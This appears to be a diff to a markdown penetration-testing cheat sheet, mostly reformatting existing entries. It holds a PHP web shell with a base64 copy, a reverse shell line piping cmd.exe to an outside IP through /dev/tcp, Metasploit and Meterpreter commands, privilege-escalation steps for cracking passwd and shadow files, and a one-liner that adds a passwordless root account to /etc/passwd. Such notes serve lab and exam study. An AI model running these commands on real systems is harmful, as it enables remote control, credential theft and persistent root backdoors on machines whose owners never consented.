@@ -333,7 +333,7 @@ You’ll need to authorise the target to connect to you (command also run on you
 `xhost +targetip`
 
 #### PHP web shell
-`<?php echo shell_exec($_GET['c']); ?>`
+`<pre><?php echo shell_exec($_GET['c']);?><pre/>` In base 64 `PHByZT48P3BocCBlY2hvIHNoZWxsX2V4ZWMoJF9HRVRbJ2MnXSk7Pz48cHJlLz4K`
 
 `cmd.exe >& /dev/tcp/10.11.0.235/80 0>&1`
 
@@ -342,17 +342,15 @@ You’ll need to authorise the target to connect to you (command also run on you
 
 #### msfconsole
 
-`set exploit/name #select exploit
-set PAYLOAD payload/name # select payload`
-
-`show options`  show options for selected payloads
-`exploit` # to start exploit
-
-`show sessions`
-
-`session -i 2` #interact with session number 2
-
-Ctrl+Z #send session to background
+```
+set exploit/name #select exploit
+set PAYLOAD payload/name # select payload
+show options #  show options for selected payloads
+exploit # to start exploit
+show sessions
+session -i 2 #interact with session number 2
+# Ctrl+Z - send session to background
+```
 
 ##### Meterperter
 `sysinfo` #display info
@@ -656,20 +654,21 @@ output: NULL
 ```
 
 # PE
+
 Sequence:
-• Easy fail - /etc/passwd (and shadow) permision, SAM file in Repairs, check how patched the system is to get an idea of next steps
-• Kernel Exploit
-• Info disclosure in compromised service/user - also check logs and home folders
-• files/folders/service (permission) misconfiguration
-• Run LPC/WPC
-• Follow PE guide
+* Easy fail - /etc/passwd (and shadow) permision, SAM file in Repairs, check how patched the system is to get an idea of next steps
+* Kernel Exploit
+* Info disclosure in compromised service/user - also check logs and home folders
+* files/folders/service (permission) misconfiguration
+* Run LPC/WPC
+* Follow PE guide
 
 Once in, look for clues in current dir and user home dir
 
 If you find both passwd and shadow you can use unshadow to combine them and then run john:
 Unshadow passwd shadow>combined
 
-Always run ps aux
+Always run ps aux:
 `ps -f ax` for parent id 
 `ps afx` for graphical parent id
 
@@ -687,6 +686,7 @@ if python is found `find / -name "python*" 2>/dev/null` it can be used to get TT
 
 Find writable files for user:
 `find / -writable -type f 2>/dev/null | grep -v ^/proc`
+
 Any suspected file run periodically (via crontab) which can be edited might allow to PE.
 	
 look through logs to find interesting processes/configurations
@@ -705,8 +705,10 @@ Run command using stickybit in executable to get shell
 check for files which stickey bits
 
 /etc/passwd is writable:
-`echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd`
-`su - dummy`
+```
+echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
+su - dummy
+```
 
 add user in both passwd and shadow toor:toor:
 ```
